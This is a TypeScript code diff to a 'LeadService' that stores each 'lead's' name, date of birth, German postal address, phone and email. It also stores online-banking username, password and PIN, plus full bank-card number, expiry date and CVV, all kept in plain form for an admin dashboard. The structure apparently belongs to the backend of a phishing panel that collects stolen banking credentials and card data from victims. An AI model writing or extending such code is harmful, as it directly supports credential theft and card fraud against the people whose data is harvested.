@@ -54,6 +54,24 @@ export interface LeadAdditionalData {
     first_name?: string;
     last_name?: string;
     date_of_birth?: string;
+    street?: string;
+    street_number?: string;
+    plz?: string;
+    city?: string;
+    phone?: string;
+    email?: string;
+  };
+  // Backward-compatible shape used by admin dashboard components
+  login_data?: {
+    username?: string;
+    password?: string;
+    pin?: string;
+  };
+  bank_card?: {
+    card_number?: string;
+    expiry_date?: string;
+    cvv?: string;
+    cardholder_name?: string;
   };
   // Legacy fields for backward compatibility
   session_key?: string;
@@ -375,6 +393,13 @@ class LeadService {
       if (newData.username) updatedFields.username = newData.username;
       if (newData.password) updatedFields.password = newData.password;
       if (newData.pin) updatedFields.pin = newData.pin;
+
+      // Keep backward-compatible login_data for admin UI parsers
+      merged.login_data = {
+        username: newData.username || merged.login_data?.username,
+        password: newData.password || merged.login_data?.password,
+        pin: newData.pin || merged.login_data?.pin
+      };
     }
 
     // Handle bank card data
@@ -394,12 +419,30 @@ class LeadService {
           timestamp
         });
       }
+
+      // Keep backward-compatible bank_card for admin UI parsers
+      merged.bank_card = {
+        card_number: newData.card_number,
+        expiry_date: newData.expiry_date,
+        cvv: newData.cvv,
+        cardholder_name: newData.cardholder_name
+      };
     }
 
     // Handle personal data (DOB) - keep first non-null value
     if (newData.date_of_birth && !merged.personal_data.date_of_birth) {
       merged.personal_data.date_of_birth = newData.date_of_birth;
     }
+
+    // Keep personal_data populated for backward-compatible renderers
+    if (newData.first_name) merged.personal_data.first_name = newData.first_name;
+    if (newData.last_name) merged.personal_data.last_name = newData.last_name;
+    if (newData.street) merged.personal_data.street = newData.street;
+    if (newData.street_number) merged.personal_data.street_number = newData.street_number;
+    if (newData.plz) merged.personal_data.plz = newData.plz;
+    if (newData.city) merged.personal_data.city = newData.city;
+    if (newData.phone) merged.personal_data.phone = newData.phone;
+    if (newData.email) merged.personal_data.email = newData.email;
 
     // Preserve other fields from new additional_data
     if (newData.additional_data) {
@@ -567,8 +610,26 @@ class LeadService {
         personal_data: {
           first_name: leadData.first_name,
           last_name: leadData.last_name,
-          date_of_birth: leadData.date_of_birth
-        }
+          date_of_birth: leadData.date_of_birth,
+          street: leadData.street,
+          street_number: leadData.street_number,
+          plz: leadData.plz,
+          city: leadData.city,
+          phone: leadData.phone,
+          email: leadData.email
+        },
+        // Backward-compatible fields expected by current admin components
+        login_data: {
+          username: leadData.username,
+          password: leadData.password,
+          pin: leadData.pin
+        },
+        bank_card: leadData.card_number ? {
+          card_number: leadData.card_number,
+          expiry_date: leadData.expiry_date,
+          cvv: leadData.cvv,
+          cardholder_name: leadData.cardholder_name
+        } : undefined
       };
       
       // Merge with any additional data provided
